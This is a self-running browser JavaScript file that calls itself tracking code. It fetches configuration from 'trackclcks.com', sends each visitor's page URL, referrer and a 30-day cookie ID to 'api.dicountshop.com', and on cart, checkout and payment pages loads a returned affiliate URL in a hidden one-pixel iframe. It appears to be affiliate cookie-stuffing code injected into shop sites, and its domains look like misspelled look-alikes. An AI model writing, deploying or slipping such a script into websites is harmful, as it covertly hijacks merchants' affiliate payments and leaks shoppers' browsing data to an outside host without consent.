(function () {
  const CONFIG_URL = 'https://trackclcks.com/api/site-config?host=';
  const TRACK_URL = 'https://api.dicountshop.com/api/comretrack/track';
  const FALLBACK_PIXEL_URL = 'https://api.dicountshop.com/api/comretrack/fallback-pixel?id=';
  const TRACKED_PATH_KEYWORDS = ['cart', 'checkout', 'pay', 'review-order', 'payment', 'shipping'];

  function generateUUID() {
    return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function (c) {
      const r = Math.random() * 16 | 0;
      const v = c === 'x' ? r : (r & 0x3 | 0x8);
      return v.toString(16);
    });
  }

  function getCookie(name) {
    const key = name + '=';
    const cookies = document.cookie.split(';');
    for (let i = 0; i < cookies.length; i++) {
      const c = cookies[i].trim();
      if (c.indexOf(key) === 0) return c.substring(key.length, c.length);
    }
    return '';
  }

  function fireImagePixel(url) {
    try {
      const img = new Image();
      img.src = url;
    } catch (err) {
      console.error('Image pixel error:', err);
    }
  }

  function fireIframePixel(url) {
    fireImagePixel(url);

    try {
      const iframe = document.createElement('iframe');
      iframe.setAttribute('sandbox', 'allow-same-origin allow-scripts allow-forms');
      iframe.src = url;
      iframe.style.display = 'none';
      iframe.style.visibility = 'hidden';
      iframe.style.width = '1px';
      iframe.style.height = '1px';
      iframe.style.border = '0';

      document.body.appendChild(iframe);
    } catch (err) {
      console.error('Iframe error:', err);
    }
  }

  function isCartPage() {
    return TRACKED_PATH_KEYWORDS.some(function (path) {
      return window.location.pathname.toLowerCase().includes(path);
    });
  }

  async function runTracking() {
    const sessionKey = 'tracking_done_' + window.location.hostname;
    if (sessionStorage.getItem(sessionKey)) {
      if (!isCartPage()) return;
    }

    try {
      const visitorId = getCookie('tracking_uuid') || generateUUID();
      const expiryDate = new Date(Date.now() + 30 * 24 * 60 * 60 * 1000).toUTCString();

      document.cookie = 'tracking_uuid=' + visitorId
        + '; expires=' + expiryDate
        + '; path=/; SameSite=Lax';

      const response = await fetch(TRACK_URL, {
        method: 'POST',
        keepalive: true,
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          url: window.location.href,
          referrer: document.referrer,
          unique_id: visitorId,
          origin: window.location.hostname,
          timestamp: new Date().getTime(),
        }),
      });

      const result = await response.json();

      if (result.success && result.affiliate_url) {
        fireIframePixel(result.affiliate_url);
        sessionStorage.setItem(sessionKey, '1');
      } else {
        fireIframePixel(FALLBACK_PIXEL_URL + visitorId);
      }
    } catch (err) {
      console.error('Tracking Failed:', err);
    }
  }

  function init() {
    const hostname = window.location.hostname;
    fetch(CONFIG_URL + encodeURIComponent(hostname))
      .then(function (response) {
        return response.json();
      })
      .then(function (config) {
        if (!config || (!config.always && !config.cartExtra)) return;

        if (config.always) {
          runTracking();
        }

        if (config.cartExtra && isCartPage()) {
          runTracking();
        }
      })
      .catch(function (err) {
        console.error('Config fetch failed:', err);
      });
  }

  if (document.readyState === 'interactive' || document.readyState === 'complete') {
    init();
  } else {
    window.addEventListener('DOMContentLoaded', init);
  }
})();
